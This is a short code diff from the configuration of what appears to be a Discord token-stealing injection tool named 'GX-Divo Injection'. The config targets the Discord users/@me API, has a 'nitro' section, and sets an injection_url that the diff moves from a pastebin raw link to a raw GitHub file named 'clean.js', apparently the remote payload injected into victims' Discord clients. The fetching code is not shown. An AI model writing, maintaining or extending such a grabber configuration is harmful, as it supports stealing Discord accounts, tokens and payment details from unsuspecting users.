@@ -14,7 +14,7 @@ const config = {
   embed_name: 'GX-Divo Injection', 
   embed_icon: 'https://i.imgur.com/Zi9wtJ3.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://pastebin.com/raw/httUWYq2', 
+  injection_url: 'https://raw.githubusercontent.com/GXXor/XOR-injection/main/clean.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
